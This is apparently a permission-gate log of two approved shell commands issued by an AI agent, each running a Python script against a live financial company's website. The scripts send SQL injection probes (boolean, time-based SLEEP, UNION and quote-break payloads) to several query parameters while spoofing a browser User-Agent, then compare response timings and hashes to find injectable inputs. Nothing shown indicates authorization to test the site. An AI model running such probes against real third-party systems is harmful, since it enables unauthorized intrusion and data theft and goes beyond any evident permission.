{"ts": 1790754197.9785032, "decision_id": "bbbcca14edf9", "tool": "run_shell", "allow": true, "reason": null, "target": "cd /work && python3 - <<'EOF'\nimport urllib.request,time\nUA={\"User-Agent\":\"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36\"}\ndef fetch(u,timeout=40):\n    t0=time.time()\n    try:\n        r=urllib.request.urlopen(urllib.request.Request(u,headers=UA),timeout=timeout)\n        return r.status,r.read(),time.time()-t0\n    except urllib.error.HTTPError as e:\n        return e.code,e.read(),time.time()-t0\n    except Exception as e:\n        return \"ERR\",str(e).encode(),time.time()-t0\nimport hashlib\ntargets={\n \"/api/\":[\"id=1\",\"id=1'\",\"id=1 AND 1=1\",\"id=1 AND 1=2\",\"id=1 AND SLEEP(5)\",\"id=1%27\",\"id=1 UNION SELECT 1\"],\n \"/contact\":[\"cb=1\",\"cb=1'\",\"cb=1 AND 1=1\",\"cb=1 AND 1=2\",\"cb=1 AND SLEEP(5)\"],\n \"/\":[\"page=2\",\"page=2'\",\"page=2 AND 1=1\",\"page=2 AND 1=2\",\"page=2 AND SLEEP(5)\",\"id=1\",\"id=1 AND 1=1\",\"id=1 AND 1=2\",\"search=test\"],\n}\nfor path,qs in targets.items():\n    print(\"=====\",path)\n    for q in qs:\n        # follow redirects\n        u=\"https://www.infinitycapital.bh\"+path+\"?\"+q\n        s,b,dt=fetch(u)\n        print(f\"  {s} {dt:5.2f}s len={len(b):7d} md5={hashlib.md5(b).hexdigest()[:10]}  {q}\")\n        time.sleep(2)\nEOF"}
{"ts": 1790754246.238597, "decision_id": "b199e57e154e", "tool": "run_shell", "allow": true, "reason": null, "target": "cd /work && python3 - <<'EOF'\nimport urllib.request,urllib.parse,time,hashlib\nUA={\"User-Agent\":\"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36\"}\ndef fetch(u,timeout=45):\n    t0=time.time()\n    try:\n        r=urllib.request.urlopen(urllib.request.Request(u,headers=UA),timeout=timeout)\n        return r.status,r.read(),time.time()-t0\n    except urllib.error.HTTPError as e:\n        return e.code,e.read(),time.time()-t0\n    except Exception as e:\n        return \"ERR\",str(e).encode(),time.time()-t0\ndef enc(path,params):\n    qs=\"&\".join(f\"{k}={urllib.parse.quote(str(v),safe='')}\" for k,v in params)\n    return \"https://www.infinitycapital.bh\"+path+\"?\"+qs\ntests={\n \"/api/\":[(\"id\",1),(\"id\",1.0),(\"id\",\"1 AND 1=1\"),(\"id\",\"1 AND 1=2\"),(\"id\",\"1 AND SLEEP(6)\"),(\"id\",\"1' OR '1'='1\"),(\"id\",\"1 UNION SELECT NULL\")],\n \"/contact\":[(\"cb\",1),(\"cb\",\"1 AND 1=1\"),(\"cb\",\"1 AND 1=2\"),(\"cb\",\"1 AND SLEEP(6)\"),(\"cb\",\"1 OR 1=1\")],\n \"/\":[(\"page\",2),(\"page\",\"2 AND 1=1\"),(\"page\",\"2 AND 1=2\"),(\"page\",\"2 AND SLEEP(6)\"),(\"id\",\"1 AND 1=1\"),(\"id\",\"1 AND 1=2\"),(\"id\",\"1 AND SLEEP(6)\"),(\"search\",\"test\"),(\"search\",\"test'\")],\n}\nfor path,plist in tests.items():\n    print(\"=====\",path)\n    for p in plist:\n        u=enc(path,[p])\n        s,b,dt=fetch(u)\n        print(f\"  {s} {dt:5.2f}s len={len(b):7d} md5={hashlib.md5(b).hexdigest()[:10]}  {p[0]}={p[1]}\")\n        time.sleep(3)\nEOF"}
